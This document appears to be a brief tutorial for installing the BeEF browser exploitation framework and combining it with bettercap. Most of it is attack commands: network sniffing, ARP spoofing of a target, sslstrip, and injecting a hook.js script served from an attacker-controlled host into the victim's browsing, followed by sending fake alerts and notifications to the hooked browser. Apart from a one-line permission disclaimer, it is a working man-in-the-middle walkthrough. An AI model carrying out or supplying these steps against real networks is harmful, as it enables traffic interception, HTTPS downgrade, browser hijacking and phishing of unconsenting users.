### BEEF XSS FRAMEWORK

BeEF is short for the Browser Exploitation Framework.

### Disclaimer

Before using, make sure you have permission


### Installation 

apt install beef-xss -y

Run as a root User 

update the default username and password after installation

 Please wait for the BeEF service to start. It will open a browser session on your localhost enter username:beef password:`your-new-password`
 
 ```
Web UI: http://127.0.0.1:3000/ui/panel
 
 ```
 
 Always refresh after new tab is opened
 
 
### COMBINING WITH BETTERCAP

```
sudo bettercap -iface eth0
```

Interface can be either eth0 / wlan0

We need to enable this services :

net.recon  - Scan our network for targets

```
net.recon on
```

net.probe  - Probe devices to gather more info

```
net.probe on
```

net.sniff  - Capture Neetwork Traffic 

```
net.sniff on
```

net.show - Show Devices connected to the network

```
net.show
```
set apr.spoof.targets 192.168.1.2 - Set Target to spoof

arp.spoof on - activate the module to start capture

help http.proxy - Understand its capabilities

set http.proxy.sslstrip true - 

set http.proxy.injectjs http://192.168.5.103:3000/hook.js - Connect with BEEF app

http.proxy on - Activate proxy

visit vulnweb.com on your target


In Beef select the new device, go to commands Browser/ Alert Dialog to create an alert then send a message, write then click execute. It will show on target machine browser

Go to Social Eng tab select fake nofification then write a message the execute, it will show on target machine





